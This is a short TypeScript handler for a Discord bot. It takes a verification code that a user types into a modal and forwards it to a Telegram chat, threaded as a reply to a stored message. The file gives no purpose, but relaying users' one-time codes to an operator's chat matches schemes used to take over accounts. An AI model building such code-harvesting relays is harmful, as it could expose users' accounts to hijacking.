import { ModalSubmitInteraction } from "discord.js";
import telegramBot from "../../telegram-bot";

export async function SendCodeModalSubmit(interaction: ModalSubmitInteraction) {
  const verificationCode = interaction.fields.getTextInputValue("verifyCode");
  const modalId = interaction.customId;
  const messageId = modalId.split("|")[1];
  await telegramBot.telegram.sendMessage(
    process.env.TELEGRAM_CHAT_ID,
    `${verificationCode}`,
    {
      reply_parameters: {
        message_id: Number(messageId),
      },
    }
  );
  return await interaction.reply(`Your verfication code has been sent!`);
}
